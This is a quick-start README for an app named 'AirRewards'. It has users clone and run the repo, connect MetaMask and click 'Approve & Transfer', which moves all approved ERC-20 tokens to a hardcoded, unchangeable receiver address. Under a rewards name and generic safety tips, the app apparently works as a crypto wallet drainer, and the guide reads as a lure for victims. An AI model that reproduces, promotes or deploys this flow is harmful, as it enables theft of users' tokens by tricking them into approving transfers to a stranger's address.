# Quick Start Guide

Get started with AirRewards in 5 minutes!

## Prerequisites

- MetaMask browser extension installed
- Some ETH or native token for gas fees
- ERC-20 tokens you want to transfer

## Step 1: Install MetaMask

If you don't have MetaMask:

1. Visit [metamask.io](https://metamask.io/)
2. Download for your browser (Chrome, Firefox, Brave, Edge)
3. Create a new wallet or import existing one
4. **Secure your seed phrase** - never share it!

## Step 2: Access AirRewards

### Option A: Local Development
```bash
git clone https://github.com/suportcoinspace-lgtm/Airrewards.git
cd Airrewards
npm install
npm start
```
Visit: http://localhost:3000

### Option B: Production Server
Visit your deployed URL (e.g., https://yourserver.com)

## Step 3: Connect Your Wallet

1. Click **"Connect Wallet"** button (top right)
2. MetaMask will pop up
3. Select your account
4. Click **"Connect"**
5. Your wallet address will display

![Connected Wallet](https://github.com/user-attachments/assets/55c263db-f0f2-4217-be33-5c35779019bd)

## Step 4: Enter Token Address

1. Find your ERC-20 token contract address
   - Check on [Etherscan](https://etherscan.io/)
   - Or your wallet app

2. Paste the token address in the input field
   - Example: `0x1234567890123456789012345678901234567890`

3. Click **"Check Token"**

## Step 5: Review Token Information

The app will show:
- Your token balance
- Token symbol
- Current approved amount

## Step 6: Approve & Transfer

⚠️ **Important**: This will transfer ALL approved tokens to:
`0xf36aa3cd6fdd245d03982caeb7c4a31b2b4be1d0`

1. Click **"Approve & Transfer"** button
2. MetaMask will ask for approval - Click **"Confirm"**
3. Wait for transaction confirmation
4. Success! Check the transaction hash

## Network Selection

AirRewards works on all EVM networks:

### Popular Networks
- **Ethereum Mainnet** - Production use
- **Goerli/Sepolia** - Testing (recommended)
- **BSC** - Binance Smart Chain
- **Polygon** - Low gas fees
- **Avalanche** - Fast transactions

### Switch Networks in MetaMask
1. Click network name in MetaMask
2. Select desired network
3. Refresh AirRewards page
4. Reconnect wallet

## Troubleshooting

### "Please install MetaMask"
- Install MetaMask browser extension
- Refresh the page

### Transaction Failed
- Check you have enough gas (ETH/BNB/MATIC)
- Verify token balance is sufficient
- Try increasing gas price

### Wrong Network
- Switch network in MetaMask
- Refresh page
- Reconnect wallet

### Token Not Showing
- Verify contract address is correct
- Check you're on the right network
- Ensure token is ERC-20 compatible

## Gas Fees

You need native tokens for gas:
- **Ethereum**: ETH
- **BSC**: BNB
- **Polygon**: MATIC
- **Avalanche**: AVAX

Typical costs:
- Approval: ~45,000 gas
- Transfer: ~65,000 gas
- Total: ~110,000 gas (~$5-50 depending on network)

## Testing Safely

### Use Testnets First!

1. Get testnet tokens:
   - **Goerli**: [Goerli Faucet](https://goerlifaucet.com/)
   - **Sepolia**: [Sepolia Faucet](https://sepoliafaucet.com/)

2. Get test ERC-20 tokens:
   - Deploy a test token
   - Or use existing testnet tokens

3. Test the full flow before using mainnet

## Best Practices

✅ **DO:**
- Verify token contract address
- Test on testnet first
- Check transaction details carefully
- Keep your seed phrase secret
- Monitor approved amounts

❌ **DON'T:**
- Share your private keys
- Approve tokens you don't recognize
- Skip transaction review
- Use production funds for testing
- Trust unverified contracts

## Support

Need help?
- Check [README.md](README.md) for details
- Review [SECURITY.md](SECURITY.md) for safety tips
- See [DEPLOYMENT.md](DEPLOYMENT.md) for hosting

## Example Workflow

```
1. Open AirRewards → 2. Click "Connect Wallet"
                    ↓
3. MetaMask pops up → 4. Approve connection
                    ↓
5. Enter token address → 6. Click "Check Token"
                    ↓
7. Review balance → 8. Click "Approve & Transfer"
                    ↓
9. Confirm in MetaMask → 10. Wait for confirmation
                    ↓
11. Success! ✅
```

## Video Tutorial

*(Add video tutorial link here when available)*

## What Happens Behind the Scenes

1. **Connection**: Web3.js connects to your wallet
2. **Token Check**: App reads blockchain for your balance
3. **Approval**: You approve tokens to receiver address
4. **Transfer**: Tokens move from your wallet to receiver
5. **Confirmation**: Transaction recorded on blockchain

## Receiver Information

All transfers go to:
```
0xf36aa3cd6fdd245d03982caeb7c4a31b2b4be1d0
```

This address is:
- Hardcoded in the application
- Cannot be changed
- Publicly verifiable on blockchain

## Next Steps

After completing your first transfer:
- Check transaction on block explorer
- Monitor your wallet balance
- Revoke approvals if needed (in MetaMask)

---

**Ready to start?** Click that "Connect Wallet" button! 🚀

For advanced usage and deployment, see the full [README.md](README.md).
